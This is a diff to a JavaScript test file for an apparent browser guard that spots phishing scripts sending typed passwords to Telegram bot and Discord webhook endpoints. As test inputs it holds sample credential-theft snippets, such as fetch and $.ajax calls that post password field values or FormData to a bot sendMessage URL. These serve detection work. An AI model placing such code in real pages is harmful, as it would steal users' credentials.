@@ -66,6 +66,7 @@ function mainWorldClassifier() {
   return {
     fetch(url, body) { win.fetch(url, { body }); },
     classify(url) { seen.length = 0; win.fetch(url, { body: 'x' }); return seen.length ? seen[0].service : null; },
+    setFormData(fd) { sandbox.FormData = fd.constructor; },
     seen, raw, win, navigator: sandbox.navigator
   };
 }
@@ -206,11 +207,13 @@ test('exfilEndpointInText: not host-anchored look-alikes in script text (M1)', (
 test('static corroboration: endpoint + an input-value read in the same script', () => {
   const url = `https://api.telegram.org/bot123456789:${TOKEN}/sendMessage`;
   assert.equal(X.exfilCredentialScript(`$.ajax({url:"${url}",data:{text:$('#password').val()}})`), 'telegram');
-  assert.equal(X.exfilCredentialScript(`fetch("${url}",{body:document.getElementById('pw').value})`), 'telegram');
+  assert.equal(X.exfilCredentialScript(`fetch("${url}",{body:document.getElementById('pwd').value})`), 'telegram');
   assert.equal(X.exfilCredentialScript(`fetch("${url}",{body:new FormData(form)})`), 'telegram');
   assert.equal(X.exfilCredentialScript(`var passwd=1; fetch("${DC}")`), 'discord');
   assert.equal(X.exfilCredentialScript(`fetch("${url}",{body:document.title+" "+location.href})`), null, 'notify widget');
   assert.equal(X.exfilCredentialScript(`$('#password').val()`), null, 'no endpoint');
+  assert.equal(X.exfilCredentialScript(`fetch("${url}",{body:select.value+form.message.value})`), null, 'bare .value is not corroboration');
+  assert.equal(X.exfilCredentialScript(`fetch("${url}"); var promo = "win a season pass";`), null, 'bare pass is not corroboration');
   assert.equal(X.exfilCredentialScript(`fetch("${url}"); // bypass the compass`), null, 'pass is word-bounded');
 });
 
@@ -227,4 +230,30 @@ test('MAIN-world guard passes non-bot fetch / XHR / beacon through unchanged', a
   assert.equal(m.seen.length, 0);
   assert.equal(m.navigator.sendBeacon(TG, 'x'), true, 'allowed when the isolated world does not cancel');
   assert.equal(m.seen.length, 1);
+});
+
+// --- fix round 2 ---
+test('secretInExfilRequest: unencoded + and %, and FormData round-tripped through the guard serializer', async () => {
+  assert.equal(hit('telegram', TGU, 'chat_id=1&text=Password: ab+cd1', ['ab+cd1']), true, 'raw + in the value');
+  assert.equal(hit('telegram', TGU, 'chat_id=1&text=Password: 100%done1', ['100%done1']), true, 'raw % (invalid escape)');
+  // the real serializer in main_world_guard.js
+  const m = mainWorldClassifier();
+  const fd = new (class { constructor() { this.e = [['chat_id', '-1001234567890'], ['text', 'Password: a&b1234']]; } entries() { return this.e[Symbol.iterator](); } })();
+  m.setFormData(fd);
+  m.fetch(TG, fd);
+  assert.equal(m.seen[0].body, 'chat_id=-1001234567890&text=Password%3A%20a%26b1234&');
+  assert.equal(hit('telegram', TGU, m.seen[0].body, ['a&b1234']), true);
+});
+
+test('secretInExfilRequest: raw-body fallback never lets a numeric password equal the chat id', () => {
+  const multipart = ['--b', 'Content-Disposition: form-data; name="chat_id"', '', '12345678', '--b', 'Content-Disposition: form-data; name="text"', '', 'hello', '--b--'].join('\r\n');
+  assert.equal(hit('telegram', TGU, multipart, ['12345678']), false);
+  assert.equal(hit('telegram', TGU, 'weird body chat_id=12345678 hello', ['12345678']), false);
+  assert.equal(hit('telegram', TGU, '{"chat_id":12345678,"x" hello', ['12345678']), false);
+  assert.equal(hit('telegram', TGU, 'weird body chat_id=1 pw 12345678 hello', ['12345678']), true);
+});
+
+test('isJsScriptType: a charset parameter is ignored', () => {
+  assert.equal(X.isJsScriptType('text/javascript; charset=utf-8'), true);
+  assert.equal(X.isJsScriptType('application/json; charset=utf-8'), false);
 });
